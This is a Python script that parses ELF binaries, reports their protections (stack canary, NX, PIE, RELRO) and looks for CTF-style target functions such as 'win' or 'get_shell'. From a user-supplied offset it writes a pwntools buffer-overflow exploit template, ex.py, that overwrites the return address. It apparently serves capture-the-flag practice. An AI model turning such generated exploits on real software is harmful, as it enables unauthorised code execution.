#!/usr/bin/env python3

import os
import struct
import sys


PT_DYNAMIC = 2
PT_GNU_STACK = 0x6474E551
PT_GNU_RELRO = 0x6474E552
PF_X = 1
SHT_SYMTAB = 2
SHT_DYNSYM = 11
ET_DYN = 3
DT_BIND_NOW = 24
DT_FLAGS = 30
DT_FLAGS_1 = 0x6FFFFFFB
DF_BIND_NOW = 0x8
DF_1_NOW = 0x1

MACHINES = {3: "i386", 40: "arm", 62: "amd64", 183: "aarch64"}
TARGETS = ["win", "system", "shell", "get_shell", "admin", "print_flag", "flag"]


def unpack(fmt, data, off):
    size = struct.calcsize(fmt)
    if off < 0 or off + size > len(data):
        raise ValueError("file is too small or broken")
    return struct.unpack_from(fmt, data, off)


def cstr(data, off):
    if off <= 0 or off >= len(data):
        return ""
    end = data.find(b"\x00", off)
    return "" if end == -1 else data[off:end].decode("utf-8", "replace")


def sec_data(data, sec):
    return data[sec["off"]:sec["off"] + sec["size"]]


def program_headers(data, endian, bits, phoff, phsize, phnum):
    items = []
    for i in range(phnum):
        off = phoff + i * phsize
        if bits == 64:
            p_type, flags, p_off, _, _, size, _, _ = unpack(endian + "IIQQQQQQ", data, off)
        else:
            p_type, p_off, _, _, size, _, flags, _ = unpack(endian + "IIIIIIII", data, off)
        items.append({"type": p_type, "flags": flags, "off": p_off, "size": size})
    return items


def sections(data, endian, bits, shoff, shsize, shnum, shstr):
    items = []
    for i in range(shnum):
        off = shoff + i * shsize
        if bits == 64:
            name, typ, _, _, s_off, size, link, _, _, entsize = unpack(endian + "IIQQQQIIQQ", data, off)
        else:
            name, typ, _, _, s_off, size, link, _, _, entsize = unpack(endian + "IIIIIIIIII", data, off)
        items.append({"name_off": name, "type": typ, "off": s_off, "size": size, "link": link, "entsize": entsize})

    names = sec_data(data, items[shstr]) if 0 <= shstr < len(items) else b""
    for sec in items:
        sec["name"] = cstr(names, sec["name_off"])
    return items


def symbols(data, endian, bits, secs):
    result = {}
    for sec in secs:
        if sec["type"] not in (SHT_SYMTAB, SHT_DYNSYM) or sec["link"] >= len(secs):
            continue

        names = sec_data(data, secs[sec["link"]])
        size = sec["entsize"] or (24 if bits == 64 else 16)

        for off in range(sec["off"], sec["off"] + sec["size"], size):
            if bits == 64:
                name, _, _, _, value, _ = unpack(endian + "IBBHQQ", data, off)
            else:
                name, value, _, _, _, _ = unpack(endian + "IIIBBH", data, off)

            sym = cstr(names, name)
            if sym and sym not in result:
                result[sym] = value
    return result


def relro(data, endian, bits, phs):
    if not any(h["type"] == PT_GNU_RELRO for h in phs):
        return "No RELRO"

    for h in phs:
        if h["type"] != PT_DYNAMIC:
            continue
        step = 16 if bits == 64 else 8
        for off in range(h["off"], h["off"] + h["size"], step):
            tag, value = unpack(endian + ("QQ" if bits == 64 else "II"), data, off)
            if tag == 0:
                break
            if tag == DT_BIND_NOW:
                return "Full RELRO"
            if tag == DT_FLAGS and value & DF_BIND_NOW:
                return "Full RELRO"
            if tag == DT_FLAGS_1 and value & DF_1_NOW:
                return "Full RELRO"

    return "Partial RELRO"


def analyze(path):
    with open(path, "rb") as f:
        data = f.read()

    if len(data) < 16 or data[:4] != b"\x7fELF":
        raise ValueError("not an ELF file")

    bits = 64 if data[4] == 2 else 32 if data[4] == 1 else 0
    endian = "<" if data[5] == 1 else ">" if data[5] == 2 else ""
    if not bits or not endian:
        raise ValueError("unknown ELF format")

    fmt = "HHIQQQIHHHHHH" if bits == 64 else "HHIIIIIHHHHHH"
    h = unpack(endian + fmt, data, 16)

    e_type, machine = h[0], h[1]
    phoff, shoff = h[4], h[5]
    phsize, phnum = h[8], h[9]
    shsize, shnum, shstr = h[10], h[11], h[12]

    phs = program_headers(data, endian, bits, phoff, phsize, phnum)
    secs = sections(data, endian, bits, shoff, shsize, shnum, shstr)
    syms = symbols(data, endian, bits, secs)
    stack = next((h for h in phs if h["type"] == PT_GNU_STACK), None)
    target = next(((name, syms[name]) for name in TARGETS if syms.get(name)), None)

    return {
        "path": path,
        "bits": bits,
        "arch": MACHINES.get(machine, str(machine)),
        "canary": "__stack_chk_fail" in syms or "__stack_chk_guard" in syms,
        "nx": True if stack is None else not bool(stack["flags"] & PF_X),
        "pie": e_type == ET_DYN,
        "relro": relro(data, endian, bits, phs),
        "target": target,
    }


def make_exploit(info, offset):
    path = info["path"].replace("\\", "/")
    pack = "p64" if info["bits"] == 64 else "p32"
    word = 8 if info["bits"] == 64 else 4

    code = [
        "from pwn import *",
        "",
        f"binary = {path!r}",
        "r = process(binary)",
        "",
        f"offset = {offset}",
        'buf = b"A" * offset',
    ]

    if info["canary"]:
        code += ['canary = b""', f'sfp = b"B" * {word}']

    if info["target"]:
        name, addr = info["target"]
        code += [f"{name} = {hex(addr)}", "", "payload = buf"]
        if info["canary"]:
            code += ["payload += canary", "payload += sfp"]
        code += [f"payload += {pack}({name})"]
    else:
        code += [f'ret = b"B" * {word}', "", "payload = buf"]
        if info["canary"]:
            code += ["payload += canary", "payload += sfp"]
        code += ["payload += ret"]

    code += ["", "r.sendline(payload)", "r.interactive()", ""]
    return "\n".join(code)


def main():
    path = sys.argv[1] if len(sys.argv) > 1 else input("Binary path: ")
    path = path.strip().strip('"')

    if not os.path.exists(path):
        print(f"[!] File not found: {path}")
        return 1

    try:
        info = analyze(path)
    except Exception as e:
        print(f"[!] Analyze failed: {e}")
        return 1

    target = "not found"
    if info["target"]:
        name, addr = info["target"]
        target = f"{name} = {hex(addr)}"

    print()
    print(f"[+] File   : {info['path']}")
    print(f"[+] Arch   : {info['arch']} ({info['bits']}bit)")
    print(f"[+] Canary : {'Enabled' if info['canary'] else 'Disabled'}")
    print(f"[+] NX     : {'Enabled' if info['nx'] else 'Disabled'}")
    print(f"[+] PIE    : {'Enabled' if info['pie'] else 'Disabled'}")
    print(f"[+] RELRO  : {info['relro']}")
    print(f"[+] Target : {target}")

    try:
        raw = input("offset: ").strip()
    except EOFError:
        raw = ""
    try:
        offset = int(raw, 0) if raw else 0
    except ValueError:
        offset = 0

    code = make_exploit(info, offset)
    with open("ex.py", "w", encoding="utf-8") as f:
        f.write(code)

    print()
    print("[+] Created ex.py")
    print()
    print(code)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
